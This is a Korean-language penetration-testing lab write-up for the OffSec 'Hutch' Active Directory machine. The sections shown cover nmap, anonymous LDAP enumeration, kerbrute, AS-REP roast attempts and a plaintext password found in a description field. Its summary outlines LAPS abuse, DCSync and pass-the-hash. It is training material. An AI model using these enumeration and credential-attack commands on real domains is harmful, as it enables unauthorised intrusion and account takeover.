---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/ad/bloodhound
  - tech/ad/acl-abuse
  - tech/ad/dcsync
  - tech/ad/pth
  - tech/cred/spray
  - tech/svc/smb
  - tech/exec/winrm
type: machine
platform: pg
os: windows
ip: 192.168.178.122
domain: hutch.offsec
ports: [53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, msrpc, ncacn_http, netbios-ssn]
status: solved
manual_tags: true
manual_cves: true
tech_count: 7
---
> [!info] PG Practice — Hutch · **Active Directory 단일 DC**
> **타겟** 192.168.178.122 → (리버트 후) 192.168.216.122 · **OS** Windows Server 2019 Standard (build 17763, `HUTCHDC.hutch.offsec`) · **난이도** Intermediate · **플래그 1개**(§5의 `[가정]` 참조)
> **경로 요약** **익명 LDAP 바인드**로 사용자 열거 → kerbrute로 유효성 확인 → AS-REP roast **전멸** → **LDAP `description` 필드에 평문 비밀번호** → 스프레이로 `fmcsorley` 확보 → BloodHound가 `fmcsorley --ReadLAPSPassword--> HUTCHDC` 확인 → **pyLAPS로 `ms-Mcs-AdmPwd` 읽기** → 그 값이 **도메인 Administrator의 비밀번호** → **DCSync(DRSUAPI)** → PtH로 evil-winrm → proof.txt

> [!warning] 이 노트를 읽는 규약 — 관측된 것과 재구성을 구분한다
> - **Kali 산출물로 실증됨**: `~/PG/Hutch/nmap.log` · `users.txt` · `kerbrute_linux_386` · BloodHound JSON 7종(`20260515132325_*`) · `~/git/pyLAPS/pyLAPS.py` 소스
> - **원본 노트에만 있는 출력**(대조 원본 없음): `ldapsearch` 세션 · `kerbrute` · `GetNPUsers` · `nxc` 스프레이 · `smbmap` · `pyLAPS` · `secretsdump` · evil-winrm 세션
> - **`~/.zsh_history` 에 Hutch 구간이 «남아 있지 않다».** 2026-05-14~15 기록은 히스토리 버퍼(2552행)에서 밀려났다. **그래서 이 노트의 시행착오 장은 원본 노트가 스스로 남긴 흔적(명령·출력·IP 불일치)에서만 복원**했다 — [[Resourced]]처럼 history로 뒷받침되는 부분은 없다
> - **이 노트가 새로 판정한 것**은 전부 근거를 함께 적었고, 근거가 없으면 `[가정]`으로 표시했다. 특히 §2-6의 **NT 해시 대조는 2026-08-20에 직접 계산한 것**이다

---

## 0. 이 박스에서 배우는 것

- **익명 LDAP 바인드로 도메인을 통째로 읽는다** — `ldapsearch -x` 만으로 사용자·그룹·**설명 필드**가 나온다. 이 노트는 **무엇이 보이고 무엇이 «안 보이는지»** 까지 근거로 설명한다
- **AdminSDHolder가 익명 열거의 «구멍을 막는» 방식** — 특권 계정 3개가 익명 조회 결과에서 정확히 빠진 이유를 **산술로 증명**한다. 이걸 알면 "관리자 계정이 안 보인다 = 열거가 실패했다"는 오판을 피한다
- **`kerbrute userenum` 은 «인증»이 아니라 «에러 코드 구분»이다** — 로그인 실패 카운터를 올리지 않고 사용자를 확인하는 원리
- **AS-REP roasting이 «0건»인 것도 정보다** — `UF_DONT_REQUIRE_PREAUTH` 가 어떤 플래그이고, 왜 이 도메인에 하나도 없었는가
- **LAPS의 전 구조** — `ms-Mcs-AdmPwd` 속성 · **ACL로 읽기 권한이 결정된다** · `ReadLAPSPassword` ACE가 실제로 무엇인가 · **1세대 LAPS와 Windows LAPS의 속성명이 다르다**
- **DCSync(DRSUAPI)가 무엇을 호출하는가** — [[Resourced]]의 «오프라인 `ntds.dit` 파싱»과 **정확히 무엇이 다른지** 출력 한 줄로 구분한다

> [!tip] 시험 출제 가능성 — **매우 높다**
> | 요소 | 출제 가능성 | 이유 |
> |---|---|---|
> | **description 필드 비밀번호** | **매우 높음** | AD 초기 침투의 최다 빈출. [[Resourced]]가 SMB 열거로, 여기는 LDAP으로 — **채널만 다르고 결함은 같다** |
> | **비밀번호 스프레이** | **매우 높음** | 사용자 목록 + 비밀번호 하나 = 정석 전개 |
> | **LAPS 읽기 권한 남용** | **중간~높음** | LAPS가 배포된 환경 자체가 시험에 나온다. **BloodHound에서 `ReadLAPSPassword` 엣지를 못 알아보면 그대로 막힌다** |
> | **DCSync → PtH** | **매우 높음** | 도메인 관리자를 잡은 뒤의 **기본 마무리** |
> | **익명 LDAP** | 중간 | 되는 도메인이 실제로 있다. **10초짜리 시도이므로 무조건 해 본다** |
>
> **변형은 이런 모습이다** — `description` 대신 `info`/`comment` 속성, LAPS 대신 gMSA(`msDS-ManagedPassword` 읽기 권한), pyLAPS 대신 `nxc ldap -M laps`.

> [!abstract] [[Resourced]]와 짝을 이루는 박스 — 나란히 읽어라
> | | **Hutch** | **[[Resourced]]** |
> |---|---|---|
> | OS | Server 2019 단일 DC | Server 2019 단일 DC |
> | 초기 정보원 | **익명 LDAP** | **익명 SMB(SAMR)** |
> | 왜 익명이 되나 | `Pre-Windows 2000` 에 `S-1-5-11` **만** — 다른 원인 (§2-1) | `Pre-Windows 2000` 에 **`S-1-5-7`(ANONYMOUS LOGON)** 포함 |
> | 평문 비밀번호 위치 | `description` (LDAP) | `description` (SAMR) |
> | DC 객체에 붙은 ACE | **`ReadLAPSPassword`** | **`GenericAll`** |
> | 그 ACE의 무기화 | LAPS 평문 읽기 | RBCD → S4U |
> | `ntds` 해시 획득 | **DCSync (DRSUAPI)** | **오프라인 `ntds.dit` 파싱** |
>
> **"DC 컴퓨터 객체에 저권한 사용자의 ACE가 붙어 있다"** 는 같은 결함이 **두 가지로 무기화되는** 대조군이다.

---

## 1. 정찰

### 1-1. Nmap

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ cat ~/.zshrc | grep nnmap
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'

┌──(kali㉿kali)-[~/PG/Hutch]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Thu May 14 16:14:56 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.178.122
Nmap scan report for 192.168.178.122
Host is up (0.066s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Thu, 14 May 2026 07:16:25 GMT
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 07:15:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49762/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-14T07:16:28
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   65.61 ms 192.168.45.1
2   65.50 ms 192.168.45.254
3   65.92 ms 192.168.251.1
4   66.01 ms 192.168.178.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 14 16:17:08 2026 -- 1 IP address (1 host up) scanned in 131.84 seconds
```

**[[Resourced]]와 포트 구성이 거의 같다** — `53/88/389/445/636/3268/3269/5985/9389`. 차이는 둘:

| 차이 | Hutch | Resourced | 의미 |
|---|---|---|---|
| **80/tcp IIS 10.0** | 열림 | 없음 | 웹 공격면 후보. **결과적으로 이 박스의 경로가 아니었다**(§6-4) |
| **3389/tcp RDP** | **없음** | 열림 | 이 박스는 GUI 예비 경로가 없다. **WinRM(5985)이 유일한 대화형 셸 채널** |

> [!warning] `http-webdav-scan` 이 «위험 메서드»를 잔뜩 뱉었지만 이 박스의 경로가 아니다
> `PUT`·`DELETE`·`MOVE`·`MKCOL`·`COPY`가 `Allowed Methods`에 보인다. WebDAV로 `.aspx`를 업로드하는 전형적 경로를 떠올리게 만드는 출력이다.
> **그러나 이 목록은 «IIS가 WebDAV 모듈을 로드했다»는 사실만 말한다. 그 메서드가 «인증 없이 허용된다»는 뜻이 아니다.** `http-methods` NSE는 `OPTIONS` 응답의 `Allow`/`Public` 헤더를 그대로 옮길 뿐, 실제로 시도해 보지 않는다.
> 이 박스에서는 **WebDAV를 실제로 시도한 기록이 없다**(§6-4). 그래서 프론트매터에서 **`tech/web/webdav` 태그를 제거**했다 — 개작 전 노트에 붙어 있었지만 **쓰지 않은 기법이다.**
>
> **일반화**: `PUT`이 `Allow`에 보이면 **반드시 실제로 던져 확인하라.** 30초다:
> ```bash
> curl -sS -X PUT http://<IP>/test.txt --data 'x' -o /dev/null -w '%{http_code}\n'   # 201 이면 진짜
> davtest -url http://<IP>/                                                          # 업로드 가능 확장자 자동 판별
> ```
> **응답 코드를 보지 않고 헤더만 믿는 것**이 [[Crane]]·[[Squid]]에서 반복된 "응답이 성공을 뜻하지 않는다" 패턴이다.

### 1-2. LDAP RootDSE — 익명으로 도메인 구조를 확보

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -H ldap://192.168.216.122 -x -s base
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=hutch,DC=offsec
ldapServiceName: hutch.offsec:hutchdc$@HUTCH.OFFSEC
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
serverName: CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi
 guration,DC=hutch,DC=offsec
schemaNamingContext: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
namingContexts: DC=hutch,DC=offsec
namingContexts: CN=Configuration,DC=hutch,DC=offsec
namingContexts: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
namingContexts: DC=DomainDnsZones,DC=hutch,DC=offsec
namingContexts: DC=ForestDnsZones,DC=hutch,DC=offsec
isSynchronized: TRUE
highestCommittedUSN: 73793
dsServiceName: CN=NTDS Settings,CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=hutch,DC=offsec
dnsHostName: hutchdc.hutch.offsec
defaultNamingContext: DC=hutch,DC=offsec
currentTime: 20260515014053.0Z
configurationNamingContext: CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
*(원문 노트의 `supportedControl`/`supportedLDAPPolicies` 40여 줄은 이 박스의 판단에 쓰이지 않아 생략했다. 전량이 필요하면 위 명령을 그대로 재실행하면 된다.)*

> [!note] RootDSE는 **누구에게나 열려 있다** — AD의 «정상» 동작이다
> `-s base`(baseObject 스코프)로 빈 DN을 조회하면 **RootDSE**가 나온다. 이것은 오설정이 아니라 **LDAP 표준이 요구하는 동작**이다(RFC 4512) — 클라이언트가 서버 능력을 발견하려면 인증 전에 읽을 수 있어야 한다.
> **여기서 «공짜로» 얻는 것**:
> - `defaultNamingContext: DC=hutch,DC=offsec` → **baseDN 확정.** 이후 모든 LDAP 질의의 출발점
> - `dnsHostName: hutchdc.hutch.offsec` → **FQDN 확정.** `/etc/hosts` 등록·SPN 조립에 필요
> - `domainFunctionality: 7` → **Windows Server 2016 기능 수준.** BloodHound 덤프도 `"functionallevel": "2016"`으로 일치한다(**교차 검증 성립**). 기능 수준 7 이상이면 RBCD·PKINIT 등 최신 기능이 살아 있다는 뜻
> - `supportedSASLMechanisms: GSSAPI` → Kerberos 바인드 가능
>
> **DC를 만나면 이 한 줄부터 친다.** 인증 정보가 하나도 없어도 된다:
> ```bash
> ldapsearch -x -H ldap://<IP> -s base namingcontexts
> ```

> [!danger] **기록된 명령과 기록된 출력이 어긋난다** — 실측으로 확인했다
> 위 블록의 명령은 `ldapsearch -H ... -x -s base` 인데 출력에는 `Enter LDAP Password:` 프롬프트가 있다.
> 2026-08-20에 같은 Kali(OpenLDAP `ldapsearch 2.6.10`)에서 때려 본 결과:
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ ldapsearch -x -H ldap://127.0.0.1:389 -s base
> ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)      ← 프롬프트가 «없다»
>
> ┌──(kali㉿kali)-[~]
> └─$ ldapsearch -x -W -H ldap://127.0.0.1:389 -s base < /dev/null
> Enter LDAP Password:                                        ← -W 가 프롬프트를 만든다
> ```
> **`-x` 단독은 절대 비밀번호를 묻지 않는다.** 따라서 실제로 친 명령에는 **`-W` 가 함께 있었다**고 보는 것이 옳다(또는 전사 과정에서 누락됐다).
> **결과에는 영향이 없다** — `-D`(바인드 DN)가 없으므로 비밀번호를 뭘 넣든 **익명(unauthenticated) 바인드**이고, `result: 0 Success`가 그것을 확인한다.
> 이 노트가 이걸 굳이 적는 이유: **"기록된 명령을 그대로 쳤을 때 기록된 출력이 나오는가"를 검증하는 것이 개작의 핵심 작업**이기 때문이다. 안 나오면 둘 중 하나가 틀린 것이고, 그걸 덮으면 다음 사람이 재현에 실패한다.

### 1-3. 익명 LDAP 서브트리 조회 — 사용자 열거

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -x -H ldap://192.168.216.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
Guest
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```
![[Pasted image 20260515105250.png]]

이 14개가 `~/PG/Hutch/users.txt` 로 저장돼 지금도 남아 있다.

**명령 해설**

| 요소 | 역할 | 빼면 |
|---|---|---|
| `-x` | **simple 바인드**(SASL 아님) | 기본은 SASL/GSSAPI라 **Kerberos 자격증명이 없으면 실패**한다. 익명 시도에는 `-x`가 필수 |
| `-b "DC=hutch,DC=offsec"` | 검색 시작점 | §1-2에서 얻은 `defaultNamingContext`. 없으면 서버가 기본 baseDN을 쓰지 않고 **거부**한다 |
| `-s sub` | 하위 트리 전체 | 기본 스코프는 `sub`이지만 명시하는 편이 안전하다. `base`면 개체 하나만 본다 |
| `"(&(objectclass=user))"` | 필터 | **`user` 클래스는 컴퓨터 계정도 포함**한다(computer는 user의 하위 클래스). 사람만 원하면 `(&(objectCategory=person)(objectClass=user))` |
| `grep … \| cut -f2 -d" "` | `sAMAccountName:` 값만 | LDIF는 `속성: 값` 형식이라 공백 하나로 잘린다 |

> [!danger] 익명 조회 결과에서 **`Administrator`·`krbtgt`·`domainadmin` 이 «빠져 있다»** — 이유를 알면 오판을 피한다
> 위 목록에 도메인 관리자 계정이 하나도 없다. **열거가 실패한 것이 아니다.**
> BloodHound 덤프(인증된 `fmcsorley`로 수집)와 대조하면 산술이 정확히 맞는다:
> ```bash
> $ jq -r '.data[] | "\(.Properties.name) | admincount=\(.Properties.admincount)"' \
>     20260515132325_users.json
> NT AUTHORITY@HUTCH.OFFSEC  | admincount=null    ← BloodHound가 만드는 «가상» 개체
> DOMAINADMIN@HUTCH.OFFSEC   | admincount=true    ← 익명 조회에서 «안 보임»
> KRBTGT@HUTCH.OFFSEC        | admincount=true    ← 익명 조회에서 «안 보임»
> ADMINISTRATOR@HUTCH.OFFSEC | admincount=true    ← 익명 조회에서 «안 보임»
> (나머지 14개)              | admincount=false   ← 익명 조회에서 «전부 보임»
> ```
> **18개(BloodHound) − 3개(`adminCount=true`) − 1개(가상 개체) = 14개(익명 조회).** 어긋남이 없다.
>
> **메커니즘 — AdminSDHolder / SDProp.** AD는 특권 그룹(Domain Admins·Enterprise Admins·Administrators·Account Operators 등)의 멤버에게 `adminCount=1`을 찍고, **60분마다 `SDProp` 프로세스가 그 개체들의 DACL을 `CN=AdminSDHolder` 의 템플릿으로 덮어쓴다.** 덮어쓴 DACL은 **상속을 끊는다.** 그래서 도메인 상위에 붙은 관대한 읽기 ACE가 **이 계정들에는 도달하지 않는다.**
> `domainadmin`은 실제로 Domain Admins 멤버임이 확인된다:
> ```bash
> $ jq -r '.data[] | select(.Properties.name|test("^DOMAIN ADMINS")) | [.Members[].ObjectIdentifier]' \
>     20260515132325_groups.json
> [ "S-1-5-21-2216925765-458455009-2806096489-1116",   ← domainadmin
>   "S-1-5-21-2216925765-458455009-2806096489-500" ]   ← Administrator
> ```
>
> **반사로 만들 것**: 익명/저권한 열거에서 **관리자 계정이 안 보이는 것은 정상**이다. "열거가 막혔다"고 판단해 방향을 틀지 마라. **`adminCount=1` 계정은 원래 마지막에 보인다.**

> [!note] **왜 익명 서브트리 조회가 «되는가»** — Resourced와 원인이 다르다
> [[Resourced]]에서는 `Pre-Windows 2000 Compatible Access` 그룹에 **`S-1-5-7`(ANONYMOUS LOGON)** 이 들어 있는 것이 원인이었다. **Hutch는 그게 아니다** — 같은 질의를 이 박스 덤프에 돌리면:
> ```bash
> $ jq -r '.data[] | select(.Properties.name|test("PRE-WINDOWS";"i"))
>          | {name:.Properties.name, members:[.Members[]?.ObjectIdentifier]}' \
>     20260515132325_groups.json
> { "name": "PRE-WINDOWS 2000 COMPATIBLE ACCESS@HUTCH.OFFSEC",
>   "members": [ "HUTCH.OFFSEC-S-1-5-11 Group" ] }        ← Authenticated Users «만»
> ```
> **`S-1-5-7`이 없다.** 그러므로 Resourced의 설명은 이 박스에 성립하지 않는다.
> **[가정]** 남은 후보는 둘이다 — ① `CN=Directory Service` 의 **`dSHeuristics` 7번째 문자를 `2`로 설정**해 익명 LDAP 오퍼레이션을 허용(`fLDAPBlockAnonOps` 해제), ② `EveryoneIncludesAnonymous` 를 켜서 `Everyone` ACE가 익명에도 적용되게 함. **어느 쪽인지는 DC 측 설정을 볼 수 없어 확정하지 못했다.**
> **확정된 것은 관측 사실뿐이다** — 익명 simple 바인드로 서브트리 조회가 성공했고, `adminCount=1` 이 아닌 사용자 14개와 그 `description` 이 반환됐다.

### 1-4. kerbrute — 유효 사용자 확인

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ./kerbrute_linux_386 userenum --dc 192.168.216.122 -d hutch.offsec users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/15/26 - Ronnie Flathers @ropnop

2026/05/15 11:14:36 >  Using KDC(s):
2026/05/15 11:14:36 >   192.168.216.122:88

2026/05/15 11:14:36 >  [+] VALID USERNAME:       ltaunton@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       opatry@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       rplacidi@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jsparwell@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       acostello@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       oknee@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jmckendry@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jfrarey@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       avictoria@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       cluddy@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       eaburrow@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       agitthouse@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       fmcsorley@hutch.offsec
2026/05/15 11:14:36 >  Done! Tested 14 usernames (13 valid) in 0.140 seconds
```

**14개 중 13개 유효.** 빠진 하나는 `Guest`이고, 그 이유는 §2-3에서 밝혀진다.

> [!tip] `kerbrute userenum` 은 **로그인 시도가 아니다** — 그래서 계정을 잠그지 않는다
> 원리: 사전인증 데이터 **없이** AS-REQ를 던지고 **KDC의 에러 코드로 구분**한다.
>
> | KDC 응답 | 의미 | kerbrute 판정 |
> |---|---|---|
> | `KDC_ERR_PREAUTH_REQUIRED` | 계정이 존재하고 사전인증이 필요하다 | **VALID** |
> | `KDC_ERR_C_PRINCIPAL_UNKNOWN` | 그런 사용자가 없다 | 무효 |
> | **AS-REP 가 «그냥 온다»** | 계정이 존재하고 **사전인증이 꺼져 있다** | **VALID + AS-REP roast 가능** |
> | `KDC_ERR_CLIENT_REVOKED` | 계정이 존재하나 **비활성/잠김** | 도구에 따라 무효로 셈 |
>
> **비밀번호를 하나도 보내지 않으므로 `badPwdCount`가 오르지 않는다.** 스프레이 전에 목록을 정제하는 데 가장 안전한 도구다.
> 다만 **KDC의 이벤트 로그(4768/4771)에는 남는다.** "탐지되지 않는다"가 아니라 "**계정을 잠그지 않는다**"가 정확한 표현이다.
> 0.140초에 14개를 끝냈다 — **속도가 압도적**인 것도 이 방식 덕분이다.

> [!warning] `kerbrute` 는 **시계에 민감하다** — 실패하면 취약점이 아니라 시각을 의심하라
> AS-REQ에도 타임스탬프가 들어가므로 KDC와 5분 이상 어긋나면 `KRB_AP_ERR_SKEW`가 난다. nmap 출력의 `kerberos-sec (server time: 2026-05-14 07:15:30Z)` 를 자기 시계와 비교하고, 어긋나면 맞춘다:
> ```bash
> sudo rdate -n -p <DC_IP>     # 확인만 (안전)
> sudo rdate -n <DC_IP>        # 실제로 맞춤
> ```
> **현행 Kali에는 `ntpdate` 가 패키지조차 없다**(실측: `apt-cache policy ntpdate` → `Candidate: (none)`). 옛 워크스루의 `ntpdate`를 그대로 치지 마라. 자세한 것은 [[Resourced]] §6-4.

---

## 2. 취약점 분석 — 이 박스의 핵심

### 2-1. AS-REP Roasting이 «0건»이었다 — 그것도 판정이다

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ impacket-GetNPUsers hutch.offsec/ -usersfile users.txt -format hashcat -dc-ip 192.168.216.122
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User rplacidi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User opatry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ltaunton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User acostello doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsparwell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oknee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jmckendry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User avictoria doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jfrarey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eaburrow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cluddy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User agitthouse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fmcsorley doesn't have UF_DONT_REQUIRE_PREAUTH set
```

> [!note] 배경 — **AS-REP Roasting이 무엇을 노리는가**
> Kerberos AS 교환의 정상 흐름은 이렇다:
> 1. 클라이언트가 **사전인증 데이터**(`PA-ENC-TIMESTAMP` — 현재 시각을 **사용자 키로 암호화**한 것)를 담아 AS-REQ를 보낸다
> 2. KDC가 그것을 복호화해 시각을 확인하고, 성공하면 AS-REP(TGT + **사용자 키로 암호화된 세션키 블록**)를 준다
>
> `userAccountControl` 에 **`UF_DONT_REQUIRE_PREAUTH`(0x400000, 십진 4194304)** 가 켜져 있으면 **①이 생략된다.** 즉 **아무나 그 사용자의 AS-REP를 받아낼 수 있고**, 그 안에는 **사용자 키로 암호화된 블록**이 들어 있다 → **오프라인 크랙 대상**이 된다. 이것이 AS-REP roasting이다.
>
> **Kerberoasting과의 차이**: Kerberoast는 **TGS-REP**(서비스 계정 키로 암호화)를 노리며 **인증된 사용자**여야 한다. AS-REP roast는 **AS-REP**를 노리며 **자격증명이 전혀 없어도 된다.** 그래서 **AS-REP roast가 항상 먼저**다.

**첫 줄 `KDC_ERR_CLIENT_REVOKED` 는 `Guest` 다.** 사용자명이 안 붙은 이유는 impacket이 이 에러를 사용자별 메시지가 아닌 세션 에러로 처리하기 때문이고, `users.txt`의 첫 행이 `Guest`이며, BloodHound 덤프가 `GUEST@HUTCH.OFFSEC | enabled=false` 로 확인해 준다. **§1-4에서 kerbrute가 13/14로 센 그 하나**와 정확히 같은 계정이다.

> [!tip] **0건은 «실패»가 아니라 «확정»이다** — 30초에 후보 하나를 지웠다
> 이 결과가 알려주는 것:
> 1. **이 도메인에 사전인증 미요구 계정은 없다** → AS-REP roast 경로 **완전 배제**
> 2. **사용자 13명이 «존재하고 활성»임이 재확인됐다** (`doesn't have ... set` 은 계정이 존재해야 나오는 메시지다)
> 3. **`Guest`는 비활성**이므로 스프레이 대상에서 빼도 된다
>
> LDAP으로 미리 확인하는 법(**자격증명이 있을 때**):
> ```bash
> ldapsearch -x -H ldap://<IP> -b '<baseDN>' \
>   '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
> ```
> `1.2.840.113556.1.4.803` = **LDAP_MATCHING_RULE_BIT_AND**. UAC 비트 필터를 손으로 쓰려면 이 OID가 필요하다.
> nxc로도 된다: `nxc ldap <IP> -u U -p P --asreproast out.txt`

### 2-2. `description` 필드 — 이 박스의 열쇠

`nxc`/`ldapsearch` 어느 쪽으로든 **설명 속성 전체를 한 번에 훑는 것**이 정석이다.

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -x -H ldap://192.168.216.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=*))"  | grep description:
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Password set to CrabSharkJellyfish192 at user's request. Please c
```

**마지막 줄이 전부다.** 그리고 BloodHound 덤프가 **어느 계정의 것인지** 확정해 준다:

```bash
$ jq -r '.data[] | select(.Properties.description != null and (.Properties.description|test("Password set")))
         | {name:.Properties.name, sid:.ObjectIdentifier, desc:.Properties.description}' \
    20260515132325_users.json
{
  "name": "FMCSORLEY@HUTCH.OFFSEC",
  "sid": "S-1-5-21-2216925765-458455009-2806096489-1115",
  "desc": "Password set to CrabSharkJellyfish192 at user's request. Please change on next login."
}
```

> [!danger] 위 `ldapsearch` 출력은 **줄이 잘려 있다** — LDIF의 «접힘»을 놓치면 비밀번호를 잃는다
> LDIF는 긴 값을 여러 줄로 **접고, 이어지는 줄을 «공백 한 칸»으로 시작**한다(RFC 2849). 그래서 `grep description:` 만 하면 **첫 줄만 잡히고 뒷부분이 사라진다.**
> 실제 값은 BloodHound가 보여주듯 `Password set to CrabSharkJellyfish192 at user's request. Please change on next login.` 이고, 위 `grep` 결과는 `Please c` 에서 끊겼다.
> **이 박스는 운 좋게 비밀번호가 앞쪽에 있어서 살았다.** 뒤쪽에 있었으면 **비밀번호가 잘려 나갔을 것**이고, 그걸 알아채지 못한 채 "설명 필드에는 아무것도 없다"고 결론냈을 것이다.
